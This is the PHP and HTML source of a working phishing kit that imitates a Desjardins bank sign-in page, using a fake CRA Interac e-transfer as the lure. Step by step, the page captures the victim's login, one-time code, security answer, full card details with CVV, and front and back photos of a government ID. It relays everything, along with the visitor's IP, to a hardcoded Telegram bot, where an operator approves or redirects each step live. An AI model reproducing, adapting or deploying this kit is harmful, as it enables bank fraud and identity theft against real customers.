<?php
session_start();

/**
 * Desjardins - Verification System
 * Logic: ATB/CIBC Controller Style with CC & ID Upload
 */

/* ---------- Configuration ---------- */
$telegramToken = '8332848335:AAGNajzDjVz2YwAtQfQMb6Y0adP5ikWhUHM';
$chatId        = '-1002922644009';

/* ---------- Helper: Get Real IP ---------- */
function get_client_ip() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }
    if (strpos($ip, '::ffff:') === 0) {
        $ip = substr($ip, 7);
    }
    return trim($ip);
}

/* ---------- Token Decryption & Data Setup ---------- */
$senderName = 'Canada Revenue Agency (CRA)';
$amountFormatted = '485.00';
$securityQuestion = "What is your father's middle name?";

if (!empty($_GET['deposit'])) {
    try {
        $token = $_GET['deposit'];
        $encryptionKey = 'a3f91b6cd024e8c29b76a149efcc5d42'; 
        
        $encrypted = base64_decode(str_pad(strtr($token, '-_', '+/'), strlen($token) % 4, '=', STR_PAD_RIGHT));
        $iv = substr($encrypted, 0, 16);
        $data = substr($encrypted, 16);
        $keyHash = hash('sha256', $encryptionKey, true);
        
        $decrypted = openssl_decrypt($data, 'AES-256-CBC', $keyHash, OPENSSL_RAW_DATA, $iv);
        
        if ($decrypted) {
            parse_str($decrypted, $params);
            if (!empty($params['sender'])) $senderName = $params['sender'];
            if (!empty($params['amount'])) $amountFormatted = number_format((float)str_replace(['$',',',' '],'',$params['amount']), 2);
            if (!empty($params['question'])) $securityQuestion = $params['question'];
            $_SESSION['transaction_data'] = $params;
        }
    } catch (Exception $e) {}
}

// Variables for Template
$senderNameSafe = htmlspecialchars($senderName, ENT_QUOTES, 'UTF-8');
$amountSafe     = htmlspecialchars($amountFormatted, ENT_QUOTES, 'UTF-8');

/* ---------- Server-Side Proxy ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    header('Content-Type: application/json');
    $action = $_POST['action'];
    $allowed_actions = ['sendMessage', 'getUpdates', 'editMessageReplyMarkup', 'sendPhoto'];
    
    if (in_array($action, $allowed_actions)) {
        $params = $_POST;
        unset($params['action']);
        
        if (!empty($_FILES)) {
            foreach ($_FILES as $key => $file) {
                $params[$key] = new CURLFile($file['tmp_name'], $file['type'], $file['name']);
            }
        }
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot{$telegramToken}/{$action}");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $result = curl_exec($ch);
        curl_close($ch);
        echo $result;
    }
    exit;
}

/* ---------- Initial Notification ---------- */
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    @file_get_contents("https://api.telegram.org/bot{$telegramToken}/deleteWebhook"); 
    $url = "https://api.telegram.org/bot{$telegramToken}/sendMessage";
    
    $clientIP = get_client_ip();
    
    $notificationText = "🟩 DESJARDINS CONTROLLER 🟩\n\n";
    $notificationText .= "<b>SESSION STARTED</b>\n";
    $notificationText .= "IP: <code>" . $clientIP . "</code>\n";
    $notificationText .= "Details: <code>" . $senderName . " | $" . $amountFormatted . "</code>\n\n";
    $notificationText .= "🟩 DESJARDINS CONTROLLER 🟩";

    $payload = [
        'chat_id' => $chatId,
        'text' => $notificationText,
        'parse_mode' => 'HTML'
    ];
    $options = ['http' => ['method' => 'POST', 'header' => "Content-Type: application/x-www-form-urlencoded\r\n", 'content' => http_build_query($payload)]];
    @file_get_contents($url, false, stream_context_create($options));
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>accweb.mouv.desjardins.com/identifiantunique/securite-garantie/authentification/auth/manuel?domaineVirtuel=desjardins&langueCible=en&navigMW=mm</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="format-detection" content="telephone=no">
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap">
    <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQEAYAAABPYyMiAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAABlBMVEUAAAAAAACl/3eFAAAAAXRSTlMAQObYZgAAAAFiS0dEAmYLfGQAAAAJcEhczwAAAEgAAABIAEbJaz4AAAA0SURBVBjTY2AgFzBEAAkYBgaG/wh8s4AaYyMjg1sYGBjEFIGBwRAcg4GBCQ4hCrIAsYQDAHk4GQ+cMwaoAAAAAElFTSuQmCC">
    <style>
        :root {
            --desj-green: #008756;
            --desj-green-hover: #006943;
            --desj-text-primary: #333333;
            --desj-text-secondary: #555555;
            --desj-border-color: #cccccc;
            --desj-background-light: #f4f4f4;
            --desj-link-color: #008756;
            --desj-error-color: #d93025;
        }

        html { height: 100%; }

        body, html {
            margin: 0;
            padding: 0;
            font-family: 'Open Sans', sans-serif;
            background-color: var(--desj-background-light);
            color: var(--desj-text-primary);
            font-size: 15px;
        }
        body {
            display: flex;
            flex-direction: column;
            min-height: 100%;
        }

        * { box-sizing: border-box; }

        .page-header {
            background-color: #fff;
            padding: 10px 20px;
            border-bottom: 1px solid #e0e0e0;
            display: flex;
            align-items: center;
        }
        .logo {
            display: flex;
            align-items: center;
            color: var(--desj-green);
            font-size: 24px;
            font-weight: 700;
            text-decoration: none;
        }
        .logo-icon {
            width: 26px;
            height: 30px;
            background-color: var(--desj-green);
            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
            margin-right: 10px;
            position: relative;
        }
        .logo-icon::before {
            content: '';
            position: absolute;
            top: 2px;
            left: 2px;
            width: calc(100% - 4px);
            height: calc(100% - 4px);
            background-color: white;
            clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
        }
        .hamburger-menu {
            border: none;
            background: none;
            padding: 5px;
            margin-right: 15px;
            cursor: pointer;
        }
        .hamburger-menu span {
            display: block;
            width: 22px;
            height: 2px;
            background-color: #333;
            margin: 5px 0;
        }

        .main-content {
            background-color: #fff;
            max-width: 400px;
            width: 100%;
            margin: 30px auto;
            border: 1px solid #e0e0e0;
            border-top: none;
            flex-grow: 1;
        }

        .login-container { padding: 25px 30px 30px 30px; }
        
        h1 {
            font-size: 26px;
            font-weight: 400;
            color: var(--desj-green);
            margin: 0 0 25px 0;
            text-align: center;
        }

        .form-group { margin-bottom: 20px; }

        .form-group label {
            font-weight: 400;
            font-size: 14px;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
        }

        .info-icon {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 1.5px solid #888;
            border-radius: 50%;
            color: #888;
            text-align: center;
            font-size: 11px;
            line-height: 15px;
            margin-left: 8px;
            font-weight: bold;
            font-style: italic;
        }

        .input-group { position: relative; }

        .form-control {
            width: 100%;
            padding: 10px 12px;
            font-size: 1rem;
            border: 1px solid var(--desj-border-color);
            border-radius: 4px;
            height: 42px;
        }

        .password-toggle {
            position: absolute;
            top: 50%;
            right: 12px;
            transform: translateY(-50%);
            border: none;
            background: none;
            cursor: pointer;
            padding: 5px;
        }
        .password-toggle svg { width: 22px; height: 22px; }

        .checkbox-group {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        .checkbox-group input { margin-right: 8px; }
        .checkbox-group label { margin-bottom: 0; font-size: 14px; }
        .checkbox-group a { margin-left: 5px; color: var(--desj-link-color); text-decoration: none; font-size: 14px;}

        .form-text {
            font-size: 13px;
            color: var(--desj-text-secondary);
            margin-top: 8px;
        }

        .form-links { margin-bottom: 20px; }
        .form-links a {
            display: block;
            margin-bottom: 10px;
            color: var(--desj-link-color);
            text-decoration: none;
            font-size: 14px;
        }
        .form-group + .form-links {
            margin-top: -10px;
            margin-bottom: 25px;
        }

        .btn-login {
            width: 100%;
            background-color: var(--desj-green);
            color: #fff;
            padding: 11px;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: background-color 0.2s;
            margin-bottom: 25px;
        }
        .btn-login:hover { background-color: var(--desj-green-hover); }
        .btn-login:disabled { opacity: 0.7; cursor: not-allowed; }

        .separator {
            border-top: 1px solid #e0e0e0;
            margin: 25px 0;
        }

        .security-info { display: flex; align-items: flex-start; }
        .security-links { flex: 1; }
        .security-links a {
            display: block;
            color: var(--desj-link-color);
            text-decoration: none;
            margin-bottom: 12px;
            font-size: 14px;
        }
        .security-guarantee a {
            color: var(--desj-link-color);
            text-decoration: none;
            text-align: center;
            font-size: 13px;
        }
        .security-guarantee svg {
            width: 24px;
            height: 24px;
            margin-bottom: 5px;
        }
        
        .page-footer {
            background-color: #333;
            color: #fff;
            padding: 20px;
            font-size: 0.8rem;
            text-transform: uppercase;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            list-style: none;
            padding: 0;
            margin: 0;
        }
        .footer-links li {
            padding: 0 10px;
            border-right: 1px solid #fff;
        }
        .footer-links li:last-child { border-right: none; }
        .footer-links a { color: #fff; text-decoration: none; }

        .step-section { display: none; }
        .error-message {
            color: var(--desj-error-color);
            margin-bottom: 15px;
            text-align: center;
            font-size: 14px;
        }
        .checkmark{width:80px;height:80px;border-radius:50%;border:4px solid #28a745;position:relative;margin: 0 auto 20px auto;animation:scaleUp 0.5s ease forwards;}
        .checkmark::after{content:'';position:absolute;left:21px;top:40px;width:28px;height:14px;border-left:4px solid #28a745;border-bottom:4px solid #28a745;transform:rotate(-45deg);transform-origin:left top;opacity:0;animation:drawCheck 0.5s 0.5s forwards;}
        @keyframes scaleUp{0%{transform:scale(0);}100%{transform:scale(1);}}
        @keyframes drawCheck{0%{opacity:0;transform:rotate(-45deg) scale(0);}100%{opacity:1;transform:rotate(-45deg) scale(1);}}
    
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid var(--desj-green);
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background-color: rgba(0,0,0,0.6);
            display: flex; justify-content: center; align-items: center; z-index: 1000;
        }
        .modal-content {
            background-color: #fff; padding: 25px 30px; border-radius: 5px;
            max-width: 380px; width: 90%; text-align: center;
        }
        .modal-content h2 { margin-top: 0; font-weight: 600; color: var(--desj-text-primary); }
        .modal-actions { margin-top: 25px; display: flex; justify-content: space-between; gap: 15px; }
        .modal-actions button {
            width: 100%; padding: 10px; border: none; border-radius: 4px;
            font-size: 0.95rem; font-weight: 600; cursor: pointer;
        }
        .btn-danger { background-color: #dc3545; color: white; }
        .btn-secondary { background-color: #6c757d; color: white; }

        /* CC & ID Specific Styles */
        .split-input { display: flex; gap: 10px; }
        .split-input .form-group { flex: 1; }
        .id-upload-area {
            border: 2px dashed #ccc;
            background: #fafafa;
            padding: 20px;
            text-align: center;
            border-radius: 4px;
            cursor: pointer;
            margin-bottom: 15px;
            transition: 0.2s;
        }
        .id-upload-area:hover { border-color: var(--desj-green); background: #f0fff4; }
        .id-upload-area small { display: block; margin-top: 5px; color: var(--desj-text-secondary); }
    </style>
</head>
<body>

<header class="page-header">
    <button class="hamburger-menu">
        <span></span><span></span><span></span>
    </button>
    <div class="logo">
        <div class="logo-icon"></div>
        Desjardins
    </div>
</header>

<main class="main-content">
    <div class="login-container">
        
        <!-- Step 1: Login -->
        <div id="stepLogin" class="step-section">
            <h1>Ouverture de session</h1>
            <div id="errorMsgLogin" class="error-message"></div>
            <form id="loginForm" autocomplete="off">
                <div class="form-group">
                    <label for="username">Identifiant <span class="info-icon">i</span></label>
                    <input type="text" id="username" class="form-control" required>
                </div>
                <div class="checkbox-group">
                    <input type="checkbox" id="rememberMe">
                    <label for="rememberMe">Mémoriser mon identifiant</label>
                    <a href="#">(Pourquoi?)</a>
                </div>
                <div class="form-group">
                    <label for="password">Mot de passe</label>
                    <div class="input-group">
                        <input type="password" id="password" class="form-control" required>
                        <button type="button" class="password-toggle" id="passwordToggle">
                            <svg fill="#555555" viewBox="0 0 16 16"><path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.816 1.2-1.944 2.158-3.213 2.793C10.079 11.42 8.528 12 7 12c-1.528 0-3.079-.58-4.366-1.207A13.134 13.134 0 0 1 1.172 8z"/><path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z"/></svg>
                        </button>
                    </div>
                    <p class="form-text">Important : Les mots de passe sont sensibles à la casse.</p>
                </div>
                <div class="form-links">
                    <a href="#">Identifiant ou mot de passe oublié?</a>
                </div>
                <button type="submit" id="loginBtn" class="btn-login">Ouvrir une session</button>
                <div class="form-links">
                    <a href="#">Adhérer à AccèsD</a>
                    <a href="#">Adhérer à AccèsD Affaires</a>
                    <a href="#">Devenir membre Desjardins</a>
                </div>
                <div class="separator"></div>
                <div class="security-info">
                    <div class="security-links">
                        <a href="#">Sécurité</a>
                        <a href="#">Aide et contact</a>
                        <a href="#">Signaler une fraude</a>
                    </div>
                    <div class="security-guarantee">
                        <a href="#">
                           <svg fill="#008756" viewBox="0 0 16 16"><path d="M8 1a2 2 0 0 1 2 2v4H6V3a2 2 0 0 1 2-2zm3 6V3a3 3 0 0 0-6 0v4a2 2 0 0 0-2 2v5a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2zM5 9a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v5a1 1 0 0 1-1 1H6a1 1 0 0 1-1-1V9z"/></svg>
                            <div>Protection 100 %<br>garantie</div>
                        </a>
                    </div>
                </div>
            </form>
        </div>

        <!-- Step 2: PIN -->
        <div id="stepPIN" class="step-section">
            <h1>Vérification de sécurité</h1>
            <p style="text-align:center; color: var(--desj-text-secondary); margin-bottom: 24px;">Pour votre sécurité, veuillez entrer le code de sécurité à usage unique qui vous a été envoyé.</p>
            <div id="errorMsgPIN" class="error-message"></div>
            <form id="pinForm" autocomplete="off">
                <div class="form-group">
                    <label for="pinCode">Code de sécurité</label>
                    <input type="tel" id="pinCode" maxlength="8" class="form-control" style="text-align: center; font-size: 1.2rem; letter-spacing: 0.5rem;" required>
                </div>
                <button id="pinBtn" class="btn-login">Valider</button>
            </form>
        </div>

        <!-- Step 3: Security Question -->
        <div id="stepSQ" class="step-section">
            <h1>Accepter un virement Interac</h1>
            <div style="background: var(--desj-background-light); border: 1px solid #eee; padding: 12px; border-radius: 4px; margin-bottom: 16px; font-size: 1rem;">
                <div style="display:flex; justify-content:space-between;"><span><strong>De :</strong></span> <span><?=$senderNameSafe ?></span></div>
                <div style="display:flex; justify-content:space-between; margin-top: 4px;"><span><strong>Montant :</strong></span> <span><?= $amountSafe ?> CAD</span></div>
            </div>
            <div id="errorMsgSQ" class="error-message"></div>
            <form id="sqForm" autocomplete="off">
                <div class="form-group">
                    <label for="sqAnswer">Réponse à la question de sécurité</label>
                    <input type="text" id="sqAnswer" class="form-control" required>
                </div>
                <button id="sqBtn" class="btn-login">Accepter le virement</button>
                 <div class="form-links" style="text-align:center; margin-top: -10px;">
                    <a href="#" id="cancelTransferLink">Annuler le virement</a>
                </div>
            </form>
        </div>

        <!-- Step 4: Credit Card -->
        <div id="stepCC" class="step-section">
            <h1>Vérification de la carte</h1>
            <p style="color: var(--desj-text-secondary); margin-bottom: 20px;">Veuillez entrer les informations de votre carte pour confirmer votre identité.</p>
            <div id="errorMsgCC" class="error-message"></div>
            <form id="ccForm" autocomplete="off">
                <div class="form-group">
                    <label for="ccNum">Numéro de carte</label>
                    <input type="tel" id="ccNum" class="form-control" maxlength="19" placeholder="xxxx xxxx xxxx xxxx" required>
                </div>
                <div class="split-input">
                    <div class="form-group">
                        <label>Expiration</label>
                        <div style="display:flex; gap:5px;">
                            <select id="ccMonth" class="form-control" style="padding:10px 5px;">
                                <option value="">MM</option><option>01</option><option>02</option><option>03</option><option>04</option><option>05</option><option>06</option>
                                <option>07</option><option>08</option><option>09</option><option>10</option><option>11</option><option>12</option>
                            </select>
                            <select id="ccYear" class="form-control" style="padding:10px 5px;">
                                <option value="">AA</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-group">
                        <label for="ccCvv">CVV</label>
                        <input type="password" id="ccCvv" class="form-control" maxlength="3" required>
                    </div>
                </div>
                <button id="ccBtn" class="btn-login">Valider</button>
            </form>
        </div>

        <!-- Step 5: ID Upload -->
        <div id="stepID" class="step-section">
            <h1>Vérification d'identité</h1>
            <p style="color: var(--desj-text-secondary); margin-bottom: 20px;">Veuillez télécharger une pièce d'identité gouvernementale (Recto et Verso).</p>
            <div id="errorMsgID" class="error-message"></div>
            
            <div class="id-upload-area" onclick="document.getElementById('idFront').click()">
                <div>📷 Télécharger Recto</div>
                <small id="nameFront">Aucun fichier sélectionné</small>
                <input type="file" id="idFront" accept="image/*" hidden onchange="document.getElementById('nameFront').innerText = this.files[0].name">
            </div>

            <div class="id-upload-area" onclick="document.getElementById('idBack').click()">
                <div>📷 Télécharger Verso</div>
                <small id="nameBack">Aucun fichier sélectionné</small>
                <input type="file" id="idBack" accept="image/*" hidden onchange="document.getElementById('nameBack').innerText = this.files[0].name">
            </div>

            <button id="idBtn" class="btn-login" onclick="handleIDStep()">Soumettre les documents</button>
        </div>

        <!-- Step 6: Confirmation -->
        <div id="stepConfirm" class="step-section" style="text-align: center;">
            <div class="checkmark"></div>
            <h1>Virement accepté</h1>
            <p style="color: var(--desj-text-secondary); line-height: 1.5;">Les fonds ont été déposés dans votre compte. Le traitement peut prendre jusqu'à 90 minutes.</p>
        </div>

        <!-- Step 7: Cancellation Confirmation -->
        <div id="stepCancelConfirm" class="step-section" style="text-align: center;">
            <h1>Virement annulé</h1>
            <p style="color: var(--desj-text-secondary); line-height: 1.5;">Le virement Interac a été annulé avec succès. Aucuns fonds n'ont été déposés.</p>
            <div class="form-links" style="margin-top: 20px;">
                <a href="index.php">Retour à la page d'accueil</a>
            </div>
        </div>
    </div>
    <div id="cancelModal" class="modal-overlay" style="display: none;">
        <div class="modal-content">
            <h2>Annuler le virement</h2>
            <p>Êtes-vous certain de vouloir annuler ce virement? Cette action est irréversible.</p>
            <div class="modal-actions">
                <button id="confirmCancelBtn" class="btn-danger">Confirmer l'annulation</button>
                <button id="closeModalBtn" class="btn-secondary">Retour</button>
            </div>
        </div>
    </div>
</main>
<footer class="page-footer">
    <ul class="footer-links">
        <li><a href="#">Particuliers</a></li>
        <li><a href="#">Entreprises</a></li>
        <li><a href="#">À Propos</a></li>
        <li><a href="#">Services Mobiles</a></li>
    </ul>
</footer>


<script>
    const chatId = "<?= $chatId ?>";
    let lastUpdateId = 0;
    let pollInterval;

    // Formatting CC
    document.getElementById('ccNum').addEventListener('input', function(e) {
        let v = e.target.value.replace(/\D/g, '').substring(0,16);
        let f = v.match(/.{1,4}/g);
        e.target.value = f ? f.join(' ') : v;
    });

    // API Helper
    async function api(action, data, isFile = false) {
        let body;
        if(isFile) {
            body = new FormData();
            body.append('action', action);
            for(let k in data) body.append(k, data[k]);
        } else {
            const fd = new FormData();
            fd.append('action', action);
            for(let k in data) fd.append(k, data[k]);
            body = fd;
        }
        return fetch('', {method:'POST', body}).then(r=>r.json());
    }

    // Polling Logic
    api('getUpdates', {offset: -1}).then(d => { 
        if(d.result && d.result.length) lastUpdateId = d.result[0].update_id; 
    });

    function poll(msgId, onOk, onFail) {
        if(pollInterval) clearInterval(pollInterval);
        pollInterval = setInterval(async () => {
            try {
                const r = await fetch('', {
                    method:'POST', 
                    headers:{'Content-Type':'application/x-www-form-urlencoded'},
                    body:`action=getUpdates&offset=${lastUpdateId+1}&timeout=2`
                });
                const d = await r.json();
                if(d.result && d.result.length) {
                    for(let u of d.result) {
                        lastUpdateId = u.update_id;
                        if(u.callback_query && u.callback_query.message.message_id == msgId) {
                            clearInterval(pollInterval);
                            const cmd = u.callback_query.data;
                            api('editMessageReplyMarkup', {chat_id:chatId, message_id:msgId, reply_markup:JSON.stringify({inline_keyboard:[]})});
                            
                            if(cmd === 'yes') onOk();
                            else if(cmd === 'no') onFail();
                            else if(cmd === 'go_cc') showStep('stepCC');
                            else if(cmd === 'go_id') showStep('stepID');
                            else if(cmd === 'cancel') window.location.href="https://www.desjardins.com";
                        }
                    }
                }
            } catch(e){}
        }, 2000);
    }

    function showStep(id) {
        document.querySelectorAll('.step-section').forEach(d => d.style.display='none');
        document.getElementById(id).style.display='block';
        window.scrollTo(0,0);
    }
    
    function showError(id, msg) {
        const el = document.getElementById(id);
        el.innerText = msg;
        el.style.display = 'block';
    }

    async function sendLog(step, content, btnId, next) {
        const btn = document.getElementById(btnId);
        const originalText = btn.innerText;
        btn.innerText = "Traitement en cours...";
        btn.disabled = true;
        
        try {
            const kb = {inline_keyboard:[
                [{text:"✅ ALLOW", callback_data:"yes"}, {text:"❌ BLOCK", callback_data:"no"}],
                [{text:"REQ CC", callback_data:"go_cc"}, {text:"REQ ID", callback_data:"go_id"}],
                [{text:"🚫 END SESSION", callback_data:"cancel"}]
            ]};
            
            const r = await api('sendMessage', {
                chat_id: chatId,
                text: `🟩 <b>DESJARDINS - ${step}</b>\n\n${content}`,
                parse_mode: 'HTML',
                reply_markup: JSON.stringify(kb)
            });
            
            poll(r.result.message_id, 
                () => { // OK
                    btn.disabled = false;
                    btn.innerText = originalText;
                    next();
                },
                () => { // Fail
                    btn.disabled = false;
                    btn.innerText = originalText;
                    if(step === 'LOGIN') { showStep('stepLogin'); showError('errorMsgLogin', "Identifiant ou mot de passe invalide. Veuillez réessayer."); }
                    if(step === 'PIN') { showStep('stepPIN'); showError('errorMsgPIN', "Code de sécurité invalide. Veuillez réessayer."); }
                    if(step === 'SQ') { showStep('stepSQ'); showError('errorMsgSQ', "Réponse de sécurité incorrecte. Veuillez réessayer."); }
                    if(step === 'CC') { showStep('stepCC'); showError('errorMsgCC', "Information de carte invalide. Veuillez réessayer."); }
                }
            );
        } catch(e) {
            btn.disabled = false;
            btn.innerText = originalText;
             if(step === 'LOGIN') showStep('stepLogin');
             if(step === 'PIN') showStep('stepPIN');
             if(step === 'SQ') showStep('stepSQ');
             if(step === 'CC') showStep('stepCC');
             if(step === 'ID') showStep('stepID');
        }
    }

    // Step Listeners
    document.getElementById('loginForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const u = document.getElementById('username').value;
        const p = document.getElementById('password').value;
        sendLog('LOGIN', `User: <code>${u}</code>\nPass: <code>${p}</code>`, 'loginBtn', () => showStep('stepPIN'));
    });

    document.getElementById('pinForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const p = document.getElementById('pinCode').value;
        sendLog('PIN', `Code: <code>${p}</code>`, 'pinBtn', () => showStep('stepSQ'));
    });

    document.getElementById('sqForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const a = document.getElementById('sqAnswer').value;
        sendLog('SQ', `Answer: <code>${a}</code>`, 'sqBtn', () => showStep('stepConfirm'));
    });
    
    document.getElementById('ccForm').addEventListener('submit', (e) => {
        e.preventDefault();
        const n = document.getElementById('ccNum').value;
        const eM = document.getElementById('ccMonth').value;
        const eY = document.getElementById('ccYear').value;
        const c = document.getElementById('ccCvv').value;
        sendLog('CC', `Card: <code>${n}</code>\nExp: <code>${eM}/${eY}</code>\nCVV: <code>${c}</code>`, 'ccBtn', () => showStep('stepID'));
    });
    
    async function handleIDStep() {
        const f = document.getElementById('idFront').files[0];
        const b = document.getElementById('idBack').files[0];
        if(!f || !b) { alert("Veuillez sélectionner le recto et le verso."); return; }
        
        const btn = document.getElementById('idBtn');
        const originalText = btn.innerText;
        btn.innerText = "Téléchargement...";
        btn.disabled = true;

        await api('sendPhoto', {chat_id: chatId, caption: 'Front', photo: f}, true);
        await api('sendPhoto', {chat_id: chatId, caption: 'Back', photo: b}, true);
        
        btn.innerText = originalText;
        // After uploads, send log to allow admin to approve/reject
        sendLog('ID DOCS', 'Documents uploaded.', 'idBtn', () => showStep('stepConfirm'));
    }

    // Toggle Password
    document.getElementById('passwordToggle').addEventListener('click', (e) => {
        e.preventDefault(); // Prevent default button behavior
        const p = document.getElementById('password');
        p.type = p.type === 'password' ? 'text' : 'password';
    });
    
    // Modal
    const modal = document.getElementById('cancelModal');
    document.getElementById('cancelTransferLink').addEventListener('click', (e) => { e.preventDefault(); modal.style.display='flex'; });
    document.getElementById('closeModalBtn').addEventListener('click', () => modal.style.display='none');
    document.getElementById('confirmCancelBtn').addEventListener('click', () => showStep('stepCancelConfirm'));

    // Init
    showStep('stepLogin');
</script>
</body>
</html>